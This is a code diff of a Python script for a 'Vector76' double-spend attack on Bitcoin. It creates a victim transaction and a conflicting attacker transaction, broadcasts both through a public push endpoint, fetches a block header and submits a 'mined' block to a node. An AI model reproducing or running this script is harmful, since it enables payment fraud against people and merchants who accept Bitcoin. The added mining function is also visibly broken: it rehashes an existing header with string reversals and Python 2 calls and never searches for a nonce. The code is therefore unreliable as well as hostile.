@@ -1,13 +1,16 @@
 import time
-
 import bitcoin
 import argparse
+import requests
 import subprocess
-import bitcoin_tools.core.transaction
+import bitcoin.core
+import bitcoin.transaction
 
+from hashlib import sha256
 from bitcoincli import Bitcoin
 from bitcoinaddress import Wallet
-from bitcoin_tools.core.transaction import TX
+from bitcoin_tools import TX
+from datetime import datetime
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 
@@ -47,6 +50,82 @@ def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return btc_amount / satoshi
 
+def broadcast_transaction(raw_tx):
+    url = "https://blockchain.info/pushtx"
+    payload = {'tx': raw_tx}
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+    response = requests.post(url, data=payload, headers=headers)
+    print(response)
+    if response.status_code == 200:
+        print("Transaction successfully broadcasted!")
+    else:
+        print(f"Failed to broadcast transaction. Status code: {response.status_code}")
+
+def get_block_header_by_txid(txid):
+    # URL to get transaction information
+    tx_url = f'https://api.blockcypher.com/v1/btc/main/txs/{txid}'
+    
+    # Request transaction information
+    tx_response = requests.get(tx_url)
+    if tx_response.status_code != 200:
+        print(f"Error while retrieving transaction information: {tx_response.status_code}")
+        return
+    
+    tx_data = tx_response.json()
+    
+    # Obtaining a block hash from transaction data
+    block_hash = tx_data.get('block_hash')
+    if not block_hash:
+        print("Transaction not found in block.")
+        return
+    
+    # URL to get block information
+    block_url = f'https://api.blockcypher.com/v1/btc/main/blocks/{block_hash}'
+    
+    # Request information about a block
+    block_response = requests.get(block_url)
+    if block_response.status_code != 200:
+        print(f"Error while retrieving block information: {block_response.status_code}")
+        return
+    
+    block_data = block_response.json()
+    
+    # Getting Block Header
+    block_header = {
+        'Block': block_data.get('hash'),
+        'Block Height': block_data.get('height'),
+        'Mined Time': block_data.get('time'),
+        'Prev Block': block_data.get('prev_block'),
+        'Merkle Root': block_data.get('mrkl_root'),
+        'Nonce': block_data.get('nonce'),
+        'Bits': block_data.get('bits'),
+        'Version': block_data.get('ver')
+    }
+    print(f"Block: {block_data.get('hash')}")
+    print(f"Block Height: {block_data.get('height')}")
+    print(f"Mined Time: {block_data.get('time')}")
+    print(f"Prev Block :  {block_data.get('prev_block')}")
+    print(f"Merkle Root : {block_data.get('mrkl_root')}")
+    print(f"Nonce: {block_data.get('nonce')}")
+    print(f"Bits: {block_data.get('bits')}")
+    print(f"Version: {block_data.get('ver')}")
+    return block_header
+
+def mine_block(block_header_V):
+    version_hex    = format(block_header_V["Version"], "08x")[::-1]
+    prev_block_hex = block_header_V["Prev Block"][::-1]
+    markle_root_hex = block_header_V["Merkle Root"][::-1]
+    timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
+    timestamp_hex = format(timestamp_s,"x")[::-1]
+    bits_hex  = format(block_header_V["Bits"], "x")[::-1]
+    nonce_hex = format(block_header_V["Nonce"], "x")[::-1]
+    header = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{nonce_hex}"
+    block_hash = sha256(sha256(header).digest()).digest()[::-1].encode("hex")
+    print(block_hash)
+    return block_hash
+
+
 args = parser.parse_args()
 rpc_host = args.node_host
 rpc_port = args.node_port
@@ -66,13 +145,10 @@ print(f"[+] {network} Mode.")
 print("Connecting Node...")
 rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
 
-info = rpc_node.getblockchaininfo()
-print(info)
 print("--------------------")
 amount_satoshi = to_satoshi(amount_BTC)
 print(amount_satoshi)
 fee_satoshi = 1500
-exit()
 bitcoin.SelectParams(network)
 print("Create T1 rawtx And sign")
 tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, victim_address).hex
@@ -96,30 +172,24 @@ print(f"Victim   Address      : {victim_address}")
 print(f"Attacker Address      : {attacker_address}")
 input(" --- Press the enter key to continue the Vector76 attack. --- ")
 print("push T1")
-result = rpc_node.sendrawtransaction(tx_victim)
-print(result)
+broadcast_transaction(tx_victim)
 print("T1 Pushed.")
+
 print("push T2")
-result = rpc_node.sendrawtransaction(tx_attacker)
-print(result)
+broadcast_transaction(tx_attacker)
+print("T2 Pushed.")
+
+print("Request Blockheader...")
+block_header_V = get_block_header_by_txid(prev_txid)
 print("Mining Vector76 Block...")
-miner_Wallet = Wallet()
-print(" --- Miner Wallet --- ")
-print(attacker_address)
-print(" -------------------- ")
-vector76_mining_hash = rpc_node.generateblock(f"{attacker_address} [{tx_attacker}]")
-print()
-print(vector76_mining_hash)
+vector76_block = mine_block(block_header_V)
+print(vector76_block)
 input("--- Send the block after pressing the enter key. --- ")
 print()
-print(f"submitblock {vector76_mining_hash}")
+print(f"submitblock {vector76_block}")
 print()
-result = rpc_node.submitblock(vector76_mining_hash)
-try:
-    result = rpc_node.sendrawtransaction(tx_attacker) #念の為
-    print(result)
-except:
-    print("")
+result = rpc_node.submitblock(vector76_block)
+print("")
 print()#おまけ
 print(f"Kamijou Touma >> Kill that blockchain transaction!!")
 print()
